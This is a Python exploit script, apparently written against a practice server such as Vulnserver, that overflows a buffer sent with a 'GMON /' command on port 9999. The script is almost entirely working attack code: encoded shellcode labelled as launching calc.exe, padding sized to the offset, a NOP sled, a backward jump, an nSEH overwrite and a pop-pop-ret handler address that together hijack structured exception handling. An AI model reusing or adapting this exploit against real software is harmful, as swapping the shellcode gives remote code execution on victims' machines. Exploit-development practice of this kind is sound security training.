import socket
from struct import pack

def connect_to_server(host='127.0.0.1', port=9999):
    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Successfully connected to {host} on port {port}")

        size = 10000
        shellcode = (
                        b"\xbd\xe8\xe5\x53\xae\xdb\xc9\xd9\x74\x24\xf4\x58\x31\xc9"
                        b"\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xc0\xec\x07\xa6\x52"
                        b"\x04\x45\x49\xab\xd4\x2a\xc3\x4e\xe5\x6a\xb7\x1b\x55\x5b"
                        b"\xb3\x4e\x59\x10\x91\x7a\xea\x54\x3e\x8c\x5b\xd2\x18\xa3"
                        b"\x5c\x4f\x58\xa2\xde\x92\x8d\x04\xdf\x5c\xc0\x45\x18\x80"
                        b"\x29\x17\xf1\xce\x9c\x88\x76\x9a\x1c\x22\xc4\x0a\x25\xd7"
                        b"\x9c\x2d\x04\x46\x97\x77\x86\x68\x74\x0c\x8f\x72\x99\x29"
                        b"\x59\x08\x69\xc5\x58\xd8\xa0\x26\xf6\x25\x0d\xd5\x06\x61"
                        b"\xa9\x06\x7d\x9b\xca\xbb\x86\x58\xb1\x67\x02\x7b\x11\xe3"
                        b"\xb4\xa7\xa0\x20\x22\x23\xae\x8d\x20\x6b\xb2\x10\xe4\x07"
                        b"\xce\x99\x0b\xc8\x47\xd9\x2f\xcc\x0c\xb9\x4e\x55\xe8\x6c"
                        b"\x6e\x85\x53\xd0\xca\xcd\x79\x05\x67\x8c\x17\xd8\xf5\xaa"
                        b"\x55\xda\x05\xb5\xc9\xb3\x34\x3e\x86\xc4\xc8\x95\xe3\x3b"
                        b"\x83\xb4\x45\xd4\x4a\x2d\xd4\xb9\x6c\x9b\x1a\xc4\xee\x2e"
                        b"\xe2\x33\xee\x5a\xe7\x78\xa8\xb7\x95\x11\x5d\xb8\x0a\x11"
                        b"\x74\xdb\xcd\x81\x14\x32\x68\x22\xbe\x4a"
                    ) ## shellcode to pop calc.exe

        # Example of sending a message (10000 'A's, which is 0x41 in ASCII)
        header = b"GMON /"
        fuzz = b"A" * (3546 - 70 + 2 - 500) # subtract 70 bytes for small jump (also got 4 bytes for nseh) 
        #add 2 for adjusment to land pricesly where we need , we also subtract 500 for our shellcode
        shellcode_filler = b"\x90" * (500 - len(shellcode)) # we fill the small shellcode area with breakpoint instruction(just to stop when testing/debugging) 
        small_jump = b"\xe9\x07\xfe\xff\xff" # we can now fit the 5 bytes in our "small_shellcode"
        nop_sled = b"\x90" * (68 - 5) # padding
        nseh = b"\xeb\xba\x90\x90" # jmp - 70 (in two compliments)
        handler = pack("<L", (0x625011ef)) # PPR SEH 0x625011ef
        junk = b"C" * (size - len (header + fuzz + shellcode + shellcode_filler + small_jump + nop_sled + nseh + handler))
        message = header + fuzz + shellcode + shellcode_filler  + small_jump + nop_sled + nseh + handler + junk
        client_socket.sendall(message)  # No need to encode since it's already in byte format
        print(f"Sent message: {message[:50]}... (truncated)")  # Truncate for readability

        # Example of receiving a response (if any)
        response = client_socket.recv(1024)
        if response:
            print(f"Received response: {response.decode('utf-8')}")
        else:
            print("No response received from the server.")

    except socket.error as e:
        print(f"Socket error: {e}")
    
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    connect_to_server()
